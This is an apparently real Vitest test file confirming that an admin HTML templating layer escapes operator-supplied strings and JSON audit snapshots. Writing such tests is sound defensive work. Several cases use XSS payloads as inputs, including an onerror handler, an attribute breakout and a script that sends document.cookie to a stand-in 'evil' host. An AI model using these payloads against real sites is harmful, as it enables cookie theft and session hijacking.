/**
 * Escaping tests for the HTML layer.
 *
 * Every page renders operator-authored strings (`reason`, `disabled_reason`,
 * `instance_label`, `operator_label`) and jsonb audit snapshots. Escaping is
 * the default here rather than something each page remembers, so these cases
 * pin that default in place.
 */

import { describe, expect, it } from "vitest";

import { escapeHtml, formatJson, html, raw, render } from "../src/admin/html.js";

describe("html escaping", () => {
  it("escapes the five characters that break out of text and attributes", () => {
    expect(escapeHtml(`&<>"'`)).toBe("&amp;&lt;&gt;&quot;&#39;");
  });

  it("escapes interpolated strings", () => {
    const evil = `<img src=x onerror=alert(1)>`;
    const out = render(html`<td>${evil}</td>`);
    expect(out).toBe("<td>&lt;img src=x onerror=alert(1)&gt;</td>");
    expect(out).not.toContain("<img");
  });

  it("escapes inside a quoted attribute so a value cannot close it", () => {
    const evil = `" onmouseover="alert(1)`;
    const out = render(html`<a title="${evil}">x</a>`);
    expect(out).toBe(`<a title="&quot; onmouseover=&quot;alert(1)">x</a>`);
  });

  it("passes Html values through without double-escaping", () => {
    const inner = html`<b>bold</b>`;
    expect(render(html`<p>${inner}</p>`)).toBe("<p><b>bold</b></p>");
  });

  it("joins arrays, escaping each element", () => {
    const rows = ["a<b", "c&d"].map((value) => html`<li>${value}</li>`);
    expect(render(html`<ul>${rows}</ul>`)).toBe("<ul><li>a&lt;b</li><li>c&amp;d</li></ul>");
  });

  it("renders null, undefined, and false as empty so conditionals read naturally", () => {
    expect(render(html`<p>${null}${undefined}${false}</p>`)).toBe("<p></p>");
    const show = false;
    expect(render(html`<p>${show && html`<b>x</b>`}</p>`)).toBe("<p></p>");
  });

  it("renders numbers and booleans", () => {
    expect(render(html`<p>${42}${true}</p>`)).toBe("<p>42true</p>");
  });

  it("only bypasses escaping through raw()", () => {
    expect(render(html`<style>${raw("a > b { color: red }")}</style>`)).toBe(
      "<style>a > b { color: red }</style>",
    );
  });

  it("renders a stored-XSS attempt in a destination reason inert", () => {
    // The realistic case: an operator-supplied disabled_reason echoed back on
    // the destination detail page.
    const reason = `</dd><script>fetch('//evil/'+document.cookie)</script>`;
    const out = render(html`<dd>${reason}</dd>`);
    expect(out).not.toContain("<script");
    expect(out).not.toContain("</dd><");
    expect(out).toContain("&lt;script&gt;");
  });
});

describe("formatJson", () => {
  it("pretty-prints objects", () => {
    expect(formatJson({ a: 1 })).toBe('{\n  "a": 1\n}');
  });

  it("parses and pretty-prints a JSON string column", () => {
    expect(formatJson('{"a":1}')).toBe('{\n  "a": 1\n}');
  });

  it("returns unparseable strings verbatim rather than throwing", () => {
    expect(formatJson("not json")).toBe("not json");
  });

  it("renders null and undefined as empty", () => {
    expect(formatJson(null)).toBe("");
    expect(formatJson(undefined)).toBe("");
  });

  it("still needs escaping by the caller — it does not escape on its own", () => {
    // Documents the contract: pages pass the result through `html`, which
    // escapes it. If that ever changes, this test is the tripwire.
    expect(formatJson({ x: "<script>" })).toContain("<script>");
    expect(render(html`<pre>${formatJson({ x: "<script>" })}</pre>`)).toContain("&lt;script&gt;");
  });
});
